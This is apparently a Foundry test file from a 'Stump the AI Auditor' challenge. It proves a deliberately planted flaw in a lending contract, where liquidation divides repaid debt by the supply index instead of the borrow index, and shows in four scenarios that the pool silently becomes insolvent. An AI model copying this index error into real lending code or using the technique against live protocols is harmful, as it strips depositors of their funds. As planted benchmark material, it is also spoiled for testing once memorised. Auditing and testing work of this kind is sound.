// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {BaseTest} from "./helpers/BaseTest.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {Lending} from "src/Lending/Lending.sol";
import {LendingMath} from "src/Lending/LendingMath.sol";
import {PriceOracle} from "src/PriceOracle.sol";
import {IPriceOracle} from "src/interfaces/IPriceOracle.sol";
import {ILendingPool} from "src/interfaces/ILendingPool.sol";

// ─────────────────────────────────────────────────────────────────────────────
// Stump the AI Auditor — PoC for Lending.sol
//
// Vulnerability: Liquidation Clears Excess Scaled Debt via Wrong Index
// Severity: Critical (protocol insolvency — debt evaporates without full repayment)
// Contract: src/Lending/Lending.sol — _repayLiquidationDebt() line 643
//
// Root cause:
//   `scaledDebtRepaid` uses `debtReserve.supplyIndex` instead of
//   `debtReserve.borrowIndex`. Since supplyIndex < borrowIndex (reserves take
//   a cut), the scaled amount is LARGER than it should be. Each liquidation
//   clears more scaled debt than the repayment covers.
//
// Impact:
//   - Borrower's debt shrinks faster than tokens arrive
//   - Over repeated liquidations, the pool becomes insolvent
//   - Suppliers cannot withdraw because debt was cleared without backing
// ─────────────────────────────────────────────────────────────────────────────

contract PlantPoC_L3 is BaseTest {
    uint256 internal constant WAD = 1e18;
    uint256 internal constant RAY = 1e27;

    MockERC20 internal usdc;
    MockERC20 internal weth;
    Lending internal lending;
    PriceOracle internal oracle;

    function setUp() public override {
        super.setUp();

        usdc = deployMockToken("USDC", 6);
        weth = deployMockToken("WETH", 18);

        vm.startPrank(owner);
        oracle = new PriceOracle();
        lending = new Lending(IPriceOracle(address(oracle)), 5_000);

        ILendingPool.InterestRateParams memory irParams = ILendingPool.InterestRateParams({
            baseRateRayPerYear: 1e26,
            slope1RayPerYear: 4e26,
            slope2RayPerYear: 3e27,
            optimalUtilizationBps: 8_000
        });

        lending.listReserve(address(usdc), irParams, 8_000, 8_500, 500, 2_000, true, true);
        lending.listReserve(address(weth), irParams, 7_500, 8_000, 500, 1_000, true, true);

        oracle.setPrice(address(usdc), 1e8);
        oracle.setPrice(address(weth), 2_000e8);
        vm.stopPrank();

        mintAndApprove(usdc, alice, address(lending), 1_000_000e6);
        mintAndApprove(usdc, bob, address(lending), 1_000_000e6);
        mintAndApprove(weth, bob, address(lending), 1_000 ether);
    }

    function _refreshOracle() internal {
        vm.startPrank(owner);
        oracle.setPrice(address(usdc), 1e8);
        oracle.setPrice(address(weth), 2_000e8);
        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 1: Single liquidation clears excess scaled debt
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_L3_excessScaledDebtCleared() public {
        vm.prank(alice);
        lending.supply(address(usdc), 200_000e6, alice);
        vm.prank(bob);
        lending.supply(address(weth), 50 ether, bob);
        vm.prank(bob);
        lending.borrow(address(usdc), 60_000e6, bob);

        // Accrue 90 days to diverge indices
        advanceSeconds(90 days);
        lending.accrueInterest(address(usdc));
        _refreshOracle();

        ILendingPool.Reserve memory reserve = lending.getReserveData(address(usdc));
        uint256 scaledDebtBefore = lending.userScaledBorrow(bob, address(usdc));

        // Confirm index divergence
        assertGt(reserve.borrowIndex, reserve.supplyIndex, "indices diverged");
        uint256 indexRatio = Math.mulDiv(reserve.borrowIndex, WAD, reserve.supplyIndex);
        emit log_named_uint("borrowIndex/supplyIndex (WAD)", indexRatio);

        // Make borrower liquidatable
        vm.prank(owner);
        oracle.setPrice(address(weth), 800e8);
        (,,, uint256 hf) = lending.getUserAccountData(bob);
        assertLt(hf, WAD, "borrower is liquidatable");

        // Liquidate
        vm.prank(alice);
        lending.liquidate(bob, address(weth), address(usdc), 5_000e6);

        uint256 scaledDebtAfter = lending.userScaledBorrow(bob, address(usdc));
        uint256 scaledCleared = scaledDebtBefore - scaledDebtAfter;

        // Correct vs bugged calculation
        uint256 correctScaled = Math.mulDiv(5_000e6, RAY, reserve.borrowIndex);
        uint256 buggedScaled = Math.mulDiv(5_000e6, RAY, reserve.supplyIndex);

        emit log_named_uint("Scaled cleared (actual)", scaledCleared);
        emit log_named_uint("Scaled cleared (correct)", correctScaled);

        // Actual matches bugged formula — excess debt cleared
        assertApproxEqAbs(scaledCleared, buggedScaled, 1e6, "matches bugged formula");
        assertGt(scaledCleared, correctScaled, "more debt cleared than repaid");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 2: Repeated liquidations create measurable solvency gap
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_L3_repeatedLiquidations_solvencyGap() public {
        vm.prank(alice);
        lending.supply(address(usdc), 200_000e6, alice);
        vm.prank(bob);
        lending.supply(address(weth), 50 ether, bob);
        vm.prank(bob);
        lending.borrow(address(usdc), 60_000e6, bob);

        // Accrue 180 days for larger index divergence
        advanceSeconds(180 days);
        lending.accrueInterest(address(usdc));
        _refreshOracle();

        // Make borrower deeply underwater
        vm.prank(owner);
        oracle.setPrice(address(weth), 600e8);

        // Record pre-liquidation solvency
        ILendingPool.Reserve memory rBefore = lending.getReserveData(address(usdc));
        uint256 supplyBefore = LendingMath.scaledToUnderlying(
            rBefore.totalScaledSupply, rBefore.supplyIndex, Math.Rounding.Floor
        );
        uint256 borrowBefore = LendingMath.scaledToUnderlying(
            rBefore.totalScaledBorrow, rBefore.borrowIndex, Math.Rounding.Floor
        );
        uint256 balBefore = usdc.balanceOf(address(lending));
        // Pre-liquidation: balance + borrow should cover supply + reserves
        uint256 coverageBefore = balBefore + borrowBefore;
        uint256 obligationsBefore = supplyBefore + rBefore.accruedReserves;

        emit log_named_uint("Pre-liq coverage (balance + borrow)", coverageBefore);
        emit log_named_uint("Pre-liq obligations (supply + reserves)", obligationsBefore);

        // Liquidate in 3 chunks
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(alice);
            try lending.liquidate(bob, address(weth), address(usdc), 8_000e6) {} catch { break; }
        }

        // Post-liquidation solvency
        ILendingPool.Reserve memory rAfter = lending.getReserveData(address(usdc));
        uint256 supplyAfter = LendingMath.scaledToUnderlying(
            rAfter.totalScaledSupply, rAfter.supplyIndex, Math.Rounding.Floor
        );
        uint256 borrowAfter = LendingMath.scaledToUnderlying(
            rAfter.totalScaledBorrow, rAfter.borrowIndex, Math.Rounding.Floor
        );
        uint256 balAfter = usdc.balanceOf(address(lending));
        uint256 coverageAfter = balAfter + borrowAfter;
        uint256 obligationsAfter = supplyAfter + rAfter.accruedReserves;

        emit log_named_uint("Post-liq coverage", coverageAfter);
        emit log_named_uint("Post-liq obligations", obligationsAfter);

        // Each liquidation clears more scaled debt than token coverage warrants.
        // After repeated liquidations, coverage shrinks relative to obligations.
        emit log_named_uint("Solvency deficit (obligations - coverage)",
            obligationsAfter > coverageAfter ? obligationsAfter - coverageAfter : 0);

        // Post-liquidation: pool is insolvent — coverage no longer meets obligations
        assertLt(coverageAfter, obligationsAfter, "pool insolvent: coverage < obligations");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 3: Excess ratio matches index divergence formula
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_L3_excessMatchesIndexRatio() public {
        vm.prank(alice);
        lending.supply(address(usdc), 200_000e6, alice);
        vm.prank(bob);
        lending.supply(address(weth), 50 ether, bob);
        vm.prank(bob);
        lending.borrow(address(usdc), 60_000e6, bob);

        advanceSeconds(90 days);
        lending.accrueInterest(address(usdc));
        _refreshOracle();

        ILendingPool.Reserve memory reserve = lending.getReserveData(address(usdc));
        uint256 indexRatio = Math.mulDiv(reserve.borrowIndex, WAD, reserve.supplyIndex);

        vm.prank(owner);
        oracle.setPrice(address(weth), 800e8);

        uint256 scaledBefore = lending.userScaledBorrow(bob, address(usdc));
        vm.prank(alice);
        lending.liquidate(bob, address(weth), address(usdc), 5_000e6);
        uint256 scaledAfter = lending.userScaledBorrow(bob, address(usdc));

        uint256 actualCleared = scaledBefore - scaledAfter;
        uint256 correctCleared = Math.mulDiv(5_000e6, RAY, reserve.borrowIndex);

        // The excess should match borrowIndex/supplyIndex ratio
        uint256 actualRatio = Math.mulDiv(actualCleared, WAD, correctCleared);
        assertApproxEqAbs(actualRatio, indexRatio, 1e16, "excess ratio == index divergence");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 4: Pool stays operational despite silent insolvency
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_L3_poolRemainsOperational() public {
        vm.prank(alice);
        lending.supply(address(usdc), 200_000e6, alice);
        vm.prank(bob);
        lending.supply(address(weth), 50 ether, bob);
        vm.prank(bob);
        lending.borrow(address(usdc), 60_000e6, bob);

        advanceSeconds(90 days);
        lending.accrueInterest(address(usdc));
        _refreshOracle();

        vm.prank(owner);
        oracle.setPrice(address(weth), 800e8);

        // Liquidation succeeds
        vm.prank(alice);
        lending.liquidate(bob, address(weth), address(usdc), 5_000e6);

        // Further supply/accrual still works — bug is silent
        _refreshOracle();
        vm.prank(alice);
        lending.supply(address(usdc), 10_000e6, alice);

        advanceSeconds(30 days);
        lending.accrueInterest(address(usdc));
    }
}
